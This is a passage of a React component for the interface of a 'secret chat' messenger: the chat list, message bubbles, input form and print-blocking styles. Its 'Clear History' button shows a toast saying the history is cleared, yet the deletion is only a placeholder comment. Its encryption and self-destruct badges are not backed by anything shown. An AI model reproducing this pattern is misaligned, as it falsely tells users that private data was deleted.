                className={cn(
                  "w-full p-3 flex items-center gap-3 rounded-xl transition-all group",
                  activeChat?.id === chat.id ? "bg-slate-800" : "hover:bg-slate-800/50"
                )}
              >
                <div className="relative">
                  <img src={chat.otherUser?.photoURL} className="w-12 h-12 rounded-full" alt="" />
                  <div className="absolute bottom-0 right-0 w-3 h-3 bg-green-500 border-2 border-[#0f172a] rounded-full"></div>
                </div>
                <div className="flex-1 text-left min-w-0">
                  <div className="flex justify-between items-center mb-0.5">
                    <p className="font-medium text-sm truncate">{chat.otherUser?.displayName}</p>
                    {chat.lastMessageTimestamp && (
                      <span className="text-[10px] text-slate-500">
                        {format(chat.lastMessageTimestamp.toDate(), 'HH:mm')}
                      </span>
                    )}
                  </div>
                  <p className="text-xs text-slate-500 truncate flex items-center gap-1 italic">
                    <Lock className="w-3 h-3 inline" />
                    {chat.lastMessage ? decryptMessage(chat.lastMessage) : 'Start a secret chat'}
                  </p>
                </div>
              </button>
            ))}
            {chats.length === 0 && !searchResults.length && (
              <div className="flex flex-col items-center justify-center py-12 text-slate-600 space-y-3">
                <MessageSquare className="w-12 h-12 opacity-20" />
                <p className="text-sm">No secret chats yet</p>
              </div>
            )}
          </div>
        </div>
      </aside>

      {/* Main Chat Area */}
      <main className={cn(
        "flex-1 flex flex-col relative bg-[#0f172a]",
        isMenuOpen && "hidden md:flex"
      )}>
        {activeChat ? (
          <>
            {/* Chat Header */}
            <header className="h-16 border-b border-slate-800 flex items-center justify-between px-4 bg-[#0f172a]/80 backdrop-blur-md sticky top-0 z-10">
              <div className="flex items-center gap-3">
                <button 
                  onClick={() => setIsMenuOpen(true)}
                  className="md:hidden p-2 hover:bg-slate-800 rounded-full"
                >
                  <MessageSquare className="w-5 h-5" />
                </button>
                <img src={activeChat.otherUser?.photoURL} className="w-10 h-10 rounded-full" alt="" />
                <div>
                  <h3 className="font-semibold text-sm">{activeChat.otherUser?.displayName}</h3>
                  <div className="flex items-center gap-1 text-[10px] text-green-500 font-bold uppercase tracking-tighter">
                    <Lock className="w-3 h-3" />
                    End-to-End Encrypted
                  </div>
                </div>
              </div>
                <div className="flex items-center gap-1">
                  <button className="p-2 hover:bg-slate-800 rounded-full text-slate-400 transition-colors">
                    <Phone className="w-5 h-5" />
                  </button>
                  <button className="p-2 hover:bg-slate-800 rounded-full text-slate-400 transition-colors">
                    <Video className="w-5 h-5" />
                  </button>
                  <div className="relative">
                    <button 
                      onClick={() => setIsMenuOpen(!isMenuOpen)}
                      className="p-2 hover:bg-slate-800 rounded-full text-slate-400 transition-colors"
                    >
                      <MoreVertical className="w-5 h-5" />
                    </button>
                    <AnimatePresence>
                      {isMenuOpen && (
                        <motion.div 
                          initial={{ opacity: 0, scale: 0.95, y: 10 }}
                          animate={{ opacity: 1, scale: 1, y: 0 }}
                          exit={{ opacity: 0, scale: 0.95, y: 10 }}
                          className="absolute right-0 mt-2 w-48 bg-slate-900 border border-slate-800 rounded-2xl shadow-2xl z-50 py-2"
                        >
                          <button 
                            onClick={() => {
                              if(confirm('Clear all messages in this chat?')) {
                                // Logic to clear messages would go here
                                toast.success('Chat history cleared');
                              }
                              setIsMenuOpen(false);
                            }}
                            className="w-full px-4 py-2 text-left text-sm hover:bg-slate-800 flex items-center gap-2 text-red-400"
                          >
                            <Trash2 className="w-4 h-4" />
                            Clear History
                          </button>
                          <button 
                            onClick={() => setIsMenuOpen(false)}
                            className="w-full px-4 py-2 text-left text-sm hover:bg-slate-800 flex items-center gap-2"
                          >
                            <Bell className="w-4 h-4" />
                            Mute Notifications
                          </button>
                          <button 
                            onClick={() => setIsMenuOpen(false)}
                            className="w-full px-4 py-2 text-left text-sm hover:bg-slate-800 flex items-center gap-2"
                          >
                            <Info className="w-4 h-4" />
                            Contact Info
                          </button>
                        </motion.div>
                      )}
                    </AnimatePresence>
                  </div>
                </div>
            </header>

            {/* Messages */}
            <div className="flex-1 overflow-y-auto p-4 space-y-4 custom-scrollbar bg-[url('https://www.transparenttextures.com/patterns/cubes.png')] bg-fixed">
              <div className="flex justify-center mb-8">
                <div className="bg-green-500/10 border border-green-500/20 text-green-500 px-4 py-2 rounded-2xl text-[10px] uppercase font-bold tracking-widest flex items-center gap-2">
                  <Shield className="w-4 h-4" />
                  Secret Chat Initialized
                </div>
              </div>

              {messages.map((msg, idx) => {
                const isMe = msg.senderId === user.uid;
                const showAvatar = idx === 0 || messages[idx-1].senderId !== msg.senderId;
                
                return (
                  <motion.div
                    initial={{ opacity: 0, scale: 0.95, y: 10 }}
                    animate={{ opacity: 1, scale: 1, y: 0 }}
                    key={msg.id}
                    className={cn(
                      "flex items-end gap-2",
                      isMe ? "flex-row-reverse" : "flex-row"
                    )}
                  >
                    {!isMe && (
                      <div className="w-8 h-8 flex-shrink-0">
                        {showAvatar && <img src={activeChat.otherUser?.photoURL} className="w-8 h-8 rounded-full" alt="" />}
                      </div>
                    )}
                    <div className={cn(
                      "max-w-[75%] px-4 py-2.5 rounded-2xl text-sm relative group",
                      isMe 
                        ? "bg-green-600 text-white rounded-br-none" 
                        : "bg-slate-800 text-slate-100 rounded-bl-none"
                    )}>
                      <p className="leading-relaxed">{decryptMessage(msg.encryptedText)}</p>
                      <div className={cn(
                        "flex items-center gap-1 mt-1 text-[9px] opacity-60",
                        isMe ? "justify-end" : "justify-start"
                      )}>
                        {msg.timestamp && format(msg.timestamp.toDate(), 'HH:mm')}
                        {isMe && <CheckCheck className="w-3 h-3" />}
                      </div>
                    </div>
                  </motion.div>
                );
              })}
              <div ref={scrollRef} />
            </div>

            {/* Input */}
            <footer className="p-4 bg-[#0f172a]">
              <form 
                onSubmit={sendMessage}
                className="flex items-center gap-2 bg-slate-900 border border-slate-800 rounded-2xl p-1 pr-2 focus-within:ring-2 focus-within:ring-green-500/50 transition-all"
              >
                <input 
                  type="text"
                  placeholder="Message..."
                  value={newMessage}
                  onChange={(e) => setNewMessage(e.target.value)}
                  className="flex-1 bg-transparent py-3 px-4 text-sm focus:outline-none"
                />
                <button 
                  type="submit"
                  disabled={!newMessage.trim()}
                  className="w-10 h-10 bg-green-500 text-white rounded-xl flex items-center justify-center hover:bg-green-400 transition-all active:scale-90 disabled:opacity-50 disabled:scale-100"
                >
                  <Send className="w-5 h-5" />
                </button>
              </form>
              <p className="text-[9px] text-center text-slate-600 mt-2 uppercase tracking-widest font-bold">
                Messages are encrypted with AES-256
              </p>
            </footer>
          </>
        ) : (
          <div className="flex-1 flex flex-col items-center justify-center text-slate-500 space-y-6 p-8 text-center">
            <div className="w-24 h-24 bg-slate-800 rounded-full flex items-center justify-center">
              <Shield className="w-12 h-12 opacity-20" />
            </div>
            <div className="max-w-xs">
              <h2 className="text-xl font-semibold text-slate-300 mb-2">Select a Secret Chat</h2>
              <p className="text-sm">Choose a contact to start a secure, end-to-end encrypted conversation.</p>
            </div>
            <div className="grid grid-cols-2 gap-4 w-full max-w-sm">
              <div className="p-4 bg-slate-800/50 rounded-2xl border border-slate-800 flex flex-col items-center gap-2">
                <Lock className="w-6 h-6 text-green-500" />
                <span className="text-[10px] font-bold uppercase">Encrypted</span>
              </div>
              <div className="p-4 bg-slate-800/50 rounded-2xl border border-slate-800 flex flex-col items-center gap-2">
                <Clock className="w-6 h-6 text-blue-500" />
                <span className="text-[10px] font-bold uppercase">Self-Destruct</span>
              </div>
            </div>
          </div>
        )}
      </main>

      <AnimatePresence>
        {isSettingsOpen && (
          <SettingsModal 
            user={user} 
            onClose={() => setIsSettingsOpen(false)} 
            onUpdate={setUser}
          />
        )}
      </AnimatePresence>

      <style>{`
        @media print {
          body * {
            visibility: hidden !important;
          }
          .no-print {
            display: none !important;
          }
          .print-protected::after {
            content: "SECURE CONTENT - PRINTING PROHIBITED";
            visibility: visible !important;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 24px;
            font-weight: bold;
            color: black;
          }
        }

        .select-none {
          -webkit-user-select: none;
          -moz-user-select: none;
          -ms-user-select: none;
          user-select: none;
        }

        .custom-scrollbar::-webkit-scrollbar {
          width: 4px;
        }
        .custom-scrollbar::-webkit-scrollbar-track {
          background: transparent;
        }
        .custom-scrollbar::-webkit-scrollbar-thumb {
          background: #334155;
          border-radius: 10px;
        }
        .custom-scrollbar::-webkit-scrollbar-thumb:hover {
          background: #475569;
        }
      `}</style>
    </div>
  );
}
